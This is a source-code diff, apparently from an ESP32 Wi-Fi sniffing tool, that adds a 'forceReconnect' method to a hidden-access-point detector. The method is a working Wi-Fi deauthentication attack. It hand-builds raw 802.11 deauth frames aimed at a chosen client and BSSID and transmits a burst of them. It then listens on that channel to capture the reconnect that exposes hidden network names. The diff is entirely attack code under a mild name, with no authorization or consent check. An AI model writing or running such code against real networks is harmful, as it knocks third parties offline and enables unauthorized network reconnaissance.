@@ -120,6 +120,78 @@ void HiddenApDetector::update() {
     }
 }
 
+bool HiddenApDetector::forceReconnect(
+    const uint8_t bssid[6],
+    const uint8_t client[6],
+    uint8_t channel,
+    uint16_t count,
+    uint16_t intervalMs,
+    uint8_t reason
+) {
+    if (!_active || !bssid || !client) return false;
+    if (channel < 1 || channel > 14) return false;
+
+    count = constrain(count, 1, 50);
+    intervalMs = constrain(intervalMs, 10, 1000);
+
+    HiddenApConfig savedConfig = _config;
+    HiddenApStats savedStats = _stats;
+    HiddenBssidEntry savedCache[HIDDEN_AP_CACHE_SIZE];
+    memcpy(savedCache, _hiddenCache, sizeof(savedCache));
+
+    // Leave promiscuous mode briefly so raw TX is not competing with the
+    // receive callback, then restore the detector after the burst.
+    esp_wifi_set_promiscuous(false);
+    _active = false;
+
+    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
+
+    wifi_config_t ap_cfg = {};
+    if (esp_wifi_get_config(WIFI_IF_AP, &ap_cfg) == ESP_OK) {
+        ap_cfg.ap.channel = channel;
+        esp_wifi_set_config(WIFI_IF_AP, &ap_cfg);
+    }
+    esp_wifi_start();
+    delay(100);
+
+    uint8_t deauth_frame[26] = {
+        0xC0, 0x00, 0x00, 0x00,
+        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+        0x00, 0x00, 0x00, 0x07
+    };
+    memcpy(deauth_frame + 4, client, 6);
+    memcpy(deauth_frame + 10, bssid, 6);
+    memcpy(deauth_frame + 16, bssid, 6);
+
+    uint32_t sent = 0;
+    uint16_t seq = 0;
+    for (uint16_t i = 0; i < count; i++) {
+        seq = (seq + 0x10) & 0xFFF0;
+        deauth_frame[22] = seq & 0xFF;
+        deauth_frame[23] = (seq >> 8) & 0xFF;
+        deauth_frame[25] = reason;
+        if (esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame, sizeof(deauth_frame), true) == ESP_OK) {
+            sent++;
+        }
+        delay(intervalMs);
+    }
+
+    // Continue listening on the channel that was just used for the burst so
+    // the reconnect exchange is captured as soon as it happens.
+    if (!savedConfig.hop) savedConfig.channel = channel;
+    bool restarted = start(savedConfig);
+    if (restarted) {
+        _stats = savedStats;
+        memcpy(_hiddenCache, savedCache, sizeof(_hiddenCache));
+    } else {
+        _active = false;
+    }
+
+    return sent > 0 && restarted;
+}
+
 void HiddenApDetector::promiscuousCb(void* buf, wifi_promiscuous_pkt_type_t type) {
     (void)type;
     if (_instance) _instance->handlePacket((wifi_promiscuous_pkt_t*)buf);
